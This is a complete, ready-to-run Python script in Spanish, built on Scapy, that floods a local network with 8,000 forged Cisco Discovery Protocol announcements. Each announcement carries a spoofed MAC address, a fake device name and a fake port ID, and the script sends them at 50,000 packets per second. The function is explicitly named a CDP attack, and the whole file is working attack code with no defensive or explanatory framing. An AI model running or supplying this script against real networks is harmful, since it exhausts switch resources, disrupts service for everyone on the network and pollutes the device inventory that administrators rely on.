import sys
from scapy.all import Ether, LLC, SNAP, sendpfast

try:
    from scapy.contrib.cdp import CDPv2_HDR, CDPMsgDeviceID, CDPMsgPlatform, CDPMsgPortID
except ImportError:
    print("[!] Error: No se pudo importar el módulo CDP de Scapy.")
    sys.exit(1)

def ataque_cdp_instantaneo(interfaz, cantidad=8000):
    lista_paquetes = []

    try:
        print(f"[*] Generando {cantidad} paquetes CDP...")
        print(f"[*] Interfaz seleccionada: {interfaz}")

        for i in range(1, cantidad + 1):
            octeto_5 = (i >> 8) & 0xff
            octeto_6 = i & 0xff
            mac_origen = f"02:00:00:00:{octeto_5:02x}:{octeto_6:02x}"

            nombre_dispositivo = f"Cisco-Falso-{i}"
            puerto_origen = f"GigabitEthernet0/{i % 24}"

            paquete = (
                Ether(src=mac_origen, dst="01:00:0c:cc:cc:cc") /
                LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                SNAP(OUI=0x00000c, code=0x2000) /
                CDPv2_HDR(vers=2, ttl=255) /
                CDPMsgDeviceID(val=nombre_dispositivo) /
                CDPMsgPlatform(val="Cisco-IOU-Switch") /
                CDPMsgPortID(iface=puerto_origen)
            )

            lista_paquetes.append(paquete)

            # Mostrar progreso cada 1000 paquetes generados
            if i % 1000 == 0:
                print(f"    [+] {i}/{cantidad} paquetes preparados.")

        print("[*] Iniciando envío masivo...")
        print("[*] Espere mientras se transmiten los paquetes...")

        sendpfast(
            lista_paquetes,
            iface=interfaz,
            pps=50000
        )

        print("[+] Proceso finalizado correctamente.")
        print(f"[+] Se enviaron {cantidad} anuncios CDP.")

    except PermissionError:
        print("[!] Error: Ejecute el script como root.")
        sys.exit(1)

    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    MI_INTERFAZ_RED = "eth0"
    CANTIDAD_A_ENVIAR = 8000

    print("=" * 50)
    print("      CDP Packet Generator")
    print("=" * 50)

    ataque_cdp_instantaneo(
        interfaz=MI_INTERFAZ_RED,
        cantidad=CANTIDAD_A_ENVIAR
    )

    print("=" * 50)
    print("              FIN")
    print("=" * 50)